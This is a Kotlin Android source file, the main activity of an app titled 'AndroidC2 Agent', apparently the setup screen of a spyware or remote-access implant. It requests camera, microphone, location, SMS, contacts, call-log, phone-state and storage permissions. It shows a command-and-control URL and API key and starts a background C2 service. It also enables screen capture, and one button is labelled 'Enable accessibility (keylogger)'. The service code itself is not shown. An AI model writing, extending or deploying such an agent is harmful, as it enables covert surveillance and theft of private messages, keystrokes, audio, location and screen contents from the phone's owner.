package com.outcome.c2

import android.Manifest
import android.app.Activity
import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.view.View
import android.widget.Button
import android.widget.LinearLayout
import android.widget.ScrollView
import android.widget.TextView
import android.widget.Toast
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat

class MainActivity : Activity() {

    private lateinit var logView: TextView
    private lateinit var scroll: ScrollView
    private val handler = Handler(Looper.getMainLooper())
    private var autoRefresh = true

    private val PERMS = mutableListOf(
        Manifest.permission.INTERNET,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.READ_SMS,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.READ_EXTERNAL_STORAGE,
        Manifest.permission.WRITE_EXTERNAL_STORAGE,
    ).apply {
        if (Build.VERSION.SDK_INT >= 33) add(Manifest.permission.POST_NOTIFICATIONS)
    }.toTypedArray()

    private val REQ = 0xC2

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(32, 48, 32, 32)
        }

        val title = TextView(this).apply {
            text = "AndroidC2 Agent"
            textSize = 20f
        }

        val info = TextView(this).apply {
            text = "C2: ${BuildConfig.C2_URL}\nKey: ${BuildConfig.API_KEY}"
            textSize = 12f
            setPadding(0, 12, 0, 24)
        }

        val btnPerm = Button(this).apply {
            text = "1. Grant permissions"
            setOnClickListener {
                ActivityCompat.requestPermissions(this@MainActivity, PERMS, REQ)
            }
        }
        val btnStart = Button(this).apply {
            text = "2. Start service"
            setOnClickListener {
                val i = Intent(this@MainActivity, C2Service::class.java)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                    startForegroundService(i)
                else
                    startService(i)
                log("main", "start service requested")
            }
        }
        val btnStop = Button(this).apply {
            text = "3. Stop service"
            setOnClickListener {
                stopService(Intent(this@MainActivity, C2Service::class.java))
                log("main", "stop service requested")
            }
        }
        val btnProjection = Button(this).apply {
            text = "4. Enable screen capture permission"
            setOnClickListener {
                startActivity(Intent(this@MainActivity, MediaProjectionSetupActivity::class.java))
            }
        }
        val btnAccess = Button(this).apply {
            text = "5. Enable accessibility (keylogger)"
            setOnClickListener {
                startActivity(Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS))
            }
        }

        val logLabel = TextView(this).apply {
            text = "─ LOG ─"
            textSize = 11f
            setPadding(0, 24, 0, 8)
        }

        val btnRow = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
        }
        val btnCopy = Button(this).apply {
            text = "Copy log"
            setOnClickListener {
                val cm = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
                cm.setPrimaryClip(ClipData.newPlainText("c2log", LogBus.read(this@MainActivity)))
                Toast.makeText(this@MainActivity, "copied", Toast.LENGTH_SHORT).show()
            }
        }
        val btnClear = Button(this).apply {
            text = "Clear"
            setOnClickListener {
                LogBus.clear(this@MainActivity)
                logView.text = "(cleared)"
            }
        }
        val btnScroll = Button(this).apply {
            text = "Bottom"
            setOnClickListener {
                scroll.post { scroll.fullScroll(View.FOCUS_DOWN) }
            }
        }
        btnRow.addView(btnCopy)
        btnRow.addView(btnClear)
        btnRow.addView(btnScroll)

        logView = TextView(this).apply {
            textSize = 10f
            setPadding(8, 8, 8, 8)
            setTextIsSelectable(true)
            typeface = android.graphics.Typeface.MONOSPACE
            text = LogBus.read(this@MainActivity)
        }
        scroll = ScrollView(this).apply {
            setBackgroundColor(0xFF000000.toInt())
            addView(logView)
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, 0, 1f
            )
        }

        root.addView(title)
        root.addView(info)
        root.addView(btnPerm)
        root.addView(btnStart)
        root.addView(btnStop)
        root.addView(btnProjection)
        root.addView(btnAccess)
        root.addView(logLabel)
        root.addView(btnRow)
        root.addView(scroll)

        setContentView(root)

        val missing = PERMS.any {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }
        if (missing) ActivityCompat.requestPermissions(this, PERMS, REQ)

        startLogRefresher()
    }

    private fun log(tag: String, msg: String) {
        LogBus.append(applicationContext, tag, msg)
        refreshLog()
    }

    private fun startLogRefresher() {
        handler.postDelayed(object : Runnable {
            override fun run() {
                if (autoRefresh) refreshLog()
                handler.postDelayed(this, 1000)
            }
        }, 1000)
    }

    private fun refreshLog() {
        val txt = LogBus.read(this)
        if (logView.text.toString() != txt) {
            logView.text = txt
            scroll.post { scroll.fullScroll(View.FOCUS_DOWN) }
        }
    }

    override fun onDestroy() {
        autoRefresh = false
        super.onDestroy()
    }
}
